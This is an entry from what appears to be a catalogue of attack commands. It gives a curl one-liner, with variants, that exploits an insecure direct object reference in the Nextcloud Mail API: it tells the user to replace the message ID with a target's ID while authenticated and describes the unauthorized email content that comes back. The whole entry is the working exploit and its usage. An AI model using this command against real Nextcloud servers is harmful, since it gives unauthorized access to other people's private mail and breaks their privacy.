---
data: >-
  curl -X GET 'https://nextcloud.example.com/apps/mail/api/messages/{ID}' -H
  'Cookie: nc_session=your_session' -H 'OCS-APIRequest: true'
tags:
  - web
  - exploit
  - curl
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 024fa1e2-806a-45d7-8639-b4e98abf8b5c
created_at: '2025-12-14T17:29:57.012Z'
updated_at: '2025-12-14T17:29:57.012Z'
verified: false
validated: true
submitted: true
---
# curl-idor-email-access

## Command

```bash
curl -X GET 'https://nextcloud.example.com/apps/mail/api/messages/{ID}' -H 'Cookie: nc_session=your_session' -H 'OCS-APIRequest: true'
```

## Description

This curl command sends a GET request to the Nextcloud Mail API to fetch an email message by ID, exploiting IDOR by using an unauthorized ID while authenticated with a valid session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{ID}` | The message ID to access (replace with target ID for exploitation) | Yes |
| `-H 'Cookie: nc_session=your_session'` | Session cookie from authenticated Nextcloud session | Yes |
| `-H 'OCS-APIRequest: true'` | Header required for Nextcloud OCS API calls | Yes |
| `-X GET` | HTTP method for fetching the message | Yes |
| `-s` (optional) | Silent mode to suppress progress meter | No |

## Examples

### Basic Usage

```bash
curl -X GET 'https://nextcloud.example.com/apps/mail/api/messages/12345' -H 'Cookie: nc_session=abc123' -H 'OCS-APIRequest: true'
```

### Advanced Usage

```bash
curl -s -X GET 'https://nextcloud.example.com/apps/mail/api/messages/12345' -H 'Cookie: nc_session=abc123' -H 'OCS-APIRequest: true' | jq '.ocs.data'
```

(Uses jq to parse JSON response for cleaner output.)

## Expected Output

Successful execution returns a JSON response with email details, such as {"ocs":{"data":{"subject":"Test Email","from":"user@example.com","message":"Email body..."}}}. If IDOR is exploited, this includes unauthorized content; otherwise, a 404 or 403 error.

## Related

- [[Related Procedure: Exploit-IDOR-in-Nextcloud-Mail]]
